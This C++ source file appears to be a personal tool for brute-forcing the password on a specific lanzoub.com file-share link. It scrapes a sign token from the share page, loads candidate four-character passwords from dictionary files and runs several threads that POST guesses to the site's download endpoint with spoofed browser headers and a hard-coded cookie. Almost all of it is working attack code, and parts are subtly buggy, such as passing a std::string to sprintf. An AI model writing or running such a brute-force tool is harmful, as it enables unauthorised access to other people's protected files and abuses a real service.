#include <stdio.h>
#include <requests.h>
#include <string.h>
#include <vector>
#include <set>
#include <thread>
#include <mutex>
#include <fstream>

#define MAX_PWD_DICT_NUMS 1679616

using namespace requests;
using namespace std;

const char* url = "http://wwta.lanzoub.com/ikLuO0iwztid";
static http_headers get_sign_headers;
static http_headers headers;
mutex get_pwd_mtx;
ofstream log_f;

static inline char* get_sign(char* ret)
{
    auto resp = requests::get(url,get_sign_headers);
    if (resp == NULL) {
        return NULL;
        // printf("request failed!\n");
    } 

    auto msg = resp->body.c_str();
    auto tmp_p = strstr(msg,"sign");
    auto start_p = strstr(tmp_p+1,"sign");
    auto end_p = strstr(start_p+1,"&p=");
    start_p+=5;
    int len = end_p-start_p;
    // printf("%p %p %d\n", start_p,end_p,len);
    memmove(ret,start_p,len);
    ret[len] = '\0';
    // printf("%s\n",msg);
    // printf("%s\n",ret);
    return ret;
}
static inline void init()
{
    get_sign_headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.78";
    headers["Host"] = "wwta.lanzoub.com";
    headers["Content-Type"] = "application/x-www-form-urlencoded";
    headers["Connection"] = "keep-alive";
    headers["Sec-Fetch-Dest"] = "empty";
    headers["Accept"] = "application/json, text/javascript, */*";
    headers["Origin"] = "https://wwta.lanzoub.com";
    headers["X-Requested-With"] = "XMLHttpRequest";
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36";
    headers["Sec-Fetch-Site"] = "same-origin";
    headers["Cookie"] = "codelen=1; ai_user=FWg/iqzvP3hpX3jVbUYNDB|2023-01-03T11:39:57.357Z; pc_ad1=1";
    
}


void get_used_dict(set<string> & pwd_dict, const char* pwd_dict_filename,int max_read=MAX_PWD_DICT_NUMS)
{
    /* 打开用于读取的文件 */
    FILE* fp = fopen(pwd_dict_filename , "r");
    if(fp == NULL) {
        perror("打开文件时发生错误");
        return;
    }
    char current_line[10] = {0};
    int i = 0;
    while (fgets(current_line, sizeof(current_line), fp) != NULL && i <max_read){
    	if(strchr(current_line,'\r'))// 如果找到指针，修改指针指向的元素为\0
    	{
            current_line[4] = '\0';
    	}
        else if(strchr(current_line,'\n'))// 如果找到指针，修改指针指向的元素为\0
    	{
            current_line[4] = '\0';
    	}
        else{
            perror("解析文件换行符发生错误");
            return;
        }
        pwd_dict.insert(current_line);
    }
}
void get_pwd_dict(vector<string> & pwd_dict, const char* pwd_dict_filename,set<string> & used_dict, int max_read=MAX_PWD_DICT_NUMS)
{
    FILE* fp;

    fp = fopen(pwd_dict_filename , "r");
    if(fp == NULL) {
        perror("打开文件时发生错误");
        return;
    }
    // int len = 0;
    int i = 0;

    // 1234\r\n\0 7
    char current_line[10] = {0};
    while (fgets(current_line, sizeof(current_line), fp) != NULL && i <max_read)
    {

    	if(strchr(current_line,'\r') || strchr(current_line,'\n') ||  strchr(current_line,'\0'))
    	{
            current_line[4] = '\0';
    	}
        else{
            printf("%s %c",current_line, current_line[4]);
            perror("解析文件换行符发生错误");
            return;
        }
        
        i++;

        if(!used_dict.count(current_line))
        {
            // len = strlen(current_line);
            // printf("%s-%d\n",current_line,len);
            pwd_dict.push_back(current_line);
        }
    }
    fclose(fp);
}
// volatile int test_x = 0;
vector<string> pwd_dict;
string get_pwd()
{
    string ret("");
    get_pwd_mtx.lock();
    // test_x += 1;
    int len = pwd_dict.size();
    if(len==0) goto end;
    else{
        int idx = rand()%len;
        ret = pwd_dict[idx];
        swap(pwd_dict[idx],pwd_dict.back());
        pwd_dict.pop_back();
        log_f << ret <<endl;
    }

end:
    get_pwd_mtx.unlock();
    return ret;
}

void task(int tid){
    int try_cnt = 0;
    while (1)
    {
        string pwd = get_pwd();
        
        if(pwd=="") {
            // printf("tid: %d 密码已用完 %d\n",tid,pwd_dict.size());
            break;
        }else{
            try_cnt++;
            // cout << pwd <<endl;
        }
    }
    printf("tid: %d 尝试次数 %d\n",tid,try_cnt);

}
void clean()
{

}
void lanz_brute(int tid, int max_tries = MAX_PWD_DICT_NUMS)
{
    char sign[100] ={0};
    get_sign(sign);
    // printf("%s\n",sign);
    // char form_data[128] = {0};
    // const char* pwd = "1234";
    // sprintf(form_data,"action=downprocess&sign=%s&p=%s",sign,pwd);
    // auto resp = requests::post("http://wwta.lanzoub.com/ajaxm.php",form_data,headers);
    // auto resp = request(req);
    // if (resp == NULL) {
    //     // return NULL;
    //     printf("request failed!\n");
    // } 
    // auto msg = resp->body.c_str();
    // printf("%d %s\r\n", resp->status_code, resp->status_message());
    // printf("msg: %s\n",msg);

    while (max_tries--)
    {
        string pwd = get_pwd();
        
        if(pwd=="") {
            // printf("tid: %d 密码已用完 %d\n",tid,pwd_dict.size());
            break;
        }
        char form_data[128] = {0};
        // const char* pwd = "1234";
        sprintf(form_data,"action=downprocess&sign=%s&p=%s",sign,pwd);
        auto resp = requests::post("http://wwta.lanzoub.com/ajaxm.php",form_data,headers);
        auto msg = resp->body.c_str();
        printf("tid:%d status_code:%d msg:%s\r\n", tid, resp->status_code, msg);
        // printf("msg: %s\n",msg);

    }
}
int main() {
    
    init();

    set<string> used_pwd_dict;
    get_used_dict(used_pwd_dict,"used_dict.txt",100);

    
    get_pwd_dict(pwd_dict,"pwd_dict.txt",used_pwd_dict,100);
    printf("%d %d\n",pwd_dict.size(),used_pwd_dict.size());
    printf("%d\n",used_pwd_dict.count("1111"));

    log_f.open("log.txt",ios::app);
    int thread_nums = 5;
    thread th[thread_nums];

	for (int i = 0; i < thread_nums; i++)
		th[i] = thread(lanz_brute,i,5);
	for (int i = 0; i < thread_nums; i++)
		th[i].join();

    
    
    log_f.close();
    return 0;
}
